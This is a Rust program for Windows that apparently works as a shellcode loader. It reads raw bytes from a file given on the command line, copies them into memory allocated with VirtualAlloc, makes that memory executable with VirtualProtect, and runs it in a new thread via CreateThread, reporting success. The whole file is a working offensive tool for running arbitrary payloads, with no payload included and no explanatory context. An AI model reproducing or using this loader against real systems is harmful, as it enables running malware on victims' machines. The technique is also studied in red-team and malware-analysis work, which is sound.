#![allow(unused)]

use std::fs::{File, OpenOptions};
use std::io::{self, Read, Error};
use std::{ptr, env};
use std::process::exit;
use colored::Colorize;
use windows::Win32::{
    Foundation::{CloseHandle, GetLastError},
    System::{
        Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS},
        Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS},
    },
};

fn read_shellcode(path: &str) -> Result<Vec<u8>, Error>{
    let mut shellcode_bytes = match File::open(path){
        Ok(shellcode_bytes) => shellcode_bytes,
        Err(e) => return Err(e)
    };

    let mut meow = Vec::new();
    shellcode_bytes.read_to_end(&mut meow);
    
    Ok(meow)
}

fn copy_shellcode(payload: *const u8, mem_address: *mut u8, plenght: usize){
    unsafe{
         ptr::copy(payload, mem_address, plenght);
    }
}
fn main(){
    // collect args

    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        println!("{}: Invalid amount of arguments", "Error".red());
        println!("{}: cargo run <path-to-shellcode/*.bin", "Example".blue());
        exit(1);
    }

    // read shellcode
    let meow = read_shellcode(&args[1]).expect("Failed to read shellcode.");

    unsafe {
        // Allocating memory
        let mem_addr = VirtualAlloc(Some(ptr::null_mut()), meow.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if mem_addr.is_null(){
            println!("[-] VirtualAlloc failed with error {}", GetLastError().0);
        }

        println!("[+] Memory Allocated at {:p}", &mem_addr);
        
        //copy shellcode
        copy_shellcode(meow.as_ptr(), mem_addr as *mut u8, meow.len());

        // Modify memory protection
        VirtualProtect(mem_addr, meow.len(), PAGE_EXECUTE_READWRITE, &mut PAGE_PROTECTION_FLAGS(0));

        // Create a local thread
        let h_thread = CreateThread(Some(ptr::null()), 0, Some(std::mem::transmute(mem_addr)), Some(ptr::null()), THREAD_CREATION_FLAGS(0), Some(ptr::null_mut())).unwrap();
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    };

    println!("[!] Success! Executed shellcode."); 
}
